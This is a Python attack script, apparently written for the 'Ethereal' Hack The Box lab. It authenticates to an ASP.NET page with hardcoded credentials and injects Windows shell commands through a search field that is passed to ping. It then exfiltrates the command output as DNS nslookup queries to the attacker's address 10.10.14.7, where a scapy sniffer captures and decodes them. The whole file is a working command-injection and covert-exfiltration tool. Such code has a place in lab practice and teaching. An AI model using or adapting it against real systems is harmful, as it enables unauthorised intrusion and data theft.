from scapy.all import *
from threading import Thread, Event
from time import sleep
import requests
from bs4 import BeautifulSoup
from requests.auth import HTTPBasicAuth
from cmd import Cmd

class Terminal(Cmd):
    prompt = '> '

    def __init__(self):
        self.auth = HTTPBasicAuth('alan', '!C414m17y57r1k3s4g41n!')
        page = requests.get('http://ethereal.htb:8080', auth=self.auth)
        soup = BeautifulSoup(page.text, 'html.parser')
        self.VS = soup.find('input', {'name':'__VIEWSTATE'})['value']
        self.VSG = soup.find('input', {'name':'__VIEWSTATEGENERATOR'})['value']
        self.EV = soup.find('input', {'name':'__EVENTVALIDATION'})['value']
        self.CTL = soup.find('input', {'name':'ctl02'})['value']
        Cmd.__init__(self)

    def do_cmd(self, args):
        #cmd = f"""-n 1 127.0.0.1 & for /f "tokens=1,2,3,4,5,6" %a in ('{args}') do nslookup %a%b%c%d%e%f 10.10.14.7 """
        #cmd = f"""-n 1 127.0.0.1 && cmd /c "{args}" """
        cmd = f"""-n 1 127.0.0.1 && start cmd /c "{args}" """
        data = {
            '__VIEWSTATE':self.VS,
            '__VIEWSTATEGENERATOR':self.VSG,
            '__EVENTVALIDATION':self.EV,
            'search':cmd,
            'ctl02':self.CTL
        }
        auth = self.auth
        requests.post('http://ethereal.htb:8080', data=data, auth=auth)

    def default(self, args):
        #cmd = f"""-n 1 127.0.0.1 & for /f "tokens=1,2,3,4,5,6" %a in ('{args}') do nslookup %a%b%c%d%e%f 10.10.14.7 """
        cmd = f"""-n 1 127.0.0.1 & for /f "tokens=1-26" %a in ('{args}') do nslookup %aZ.Q%bZ.Q%cZ.Q%dZ.Q%eZ.Q%fZ.Q%gZ.Q%hZ.Q%iZ.Q%jZ.Q%kZ.Q%lZ.Q%mZ.Q%nZ.Q%oZ.Q%pZ.Q%qZ.Q%rZ.Q%sZ.Q%tZ.Q%uZ.Q%vZ.Q%wZ.Q%xZ.Q%yZ.Q.%z 10.10.14.7 """
        data = {
            '__VIEWSTATE':self.VS,
            '__VIEWSTATEGENERATOR':self.VSG,
            '__EVENTVALIDATION':self.EV,
            'search':cmd,
            'ctl02':self.CTL
        }
        auth = self.auth
        requests.post('http://ethereal.htb:8080', data=data, auth=auth)


class Sniffer(Thread):
    def  __init__(self, interface="tun0"):
        super().__init__()
        self.daemon = True
        self.socket = None
        self.interface = interface
        self.stop_sniffer = Event()
    def run(self):
        self.socket = conf.L2listen(
            type=ETH_P_ALL,
            iface=self.interface,
            filter="ip"
        )
        sniff(
            opened_socket=self.socket,
            prn=self.print_packet,
            stop_filter=self.should_stop_sniffer
        )
    def join(self, timeout=None):
        self.stop_sniffer.set()
        super().join(timeout)
    def should_stop_sniffer(self, packet):
        return self.stop_sniffer.isSet()
    def print_packet(self, packet):
        if (packet.haslayer(DNS)):
            if packet.dport == 53:
                qname = (packet.qd.qname).decode('utf-8')
                qtype = packet.qd.qtype
                if qtype == 1:
                    print(qname.replace('Z.Q', " ")[0:-1].strip())
                #print(qname)
                #print(qtype)
                #print(packet)
        ip_layer = packet.getlayer(IP)
        #print("[!] New Packet: {src} -> {dst}".format(src=ip_layer.src, dst=ip_layer.dst))

sniffer = Sniffer()
print("[*] Start sniffing...")
sniffer.start()

terminal = Terminal()
terminal.cmdloop()

try:
    while True:
        sleep(100)
except KeyboardInterrupt:
    print("[*] Stop sniffing")
    sniffer.join(2.0)
    if sniffer.isAlive():
        sniffer.socket.close()


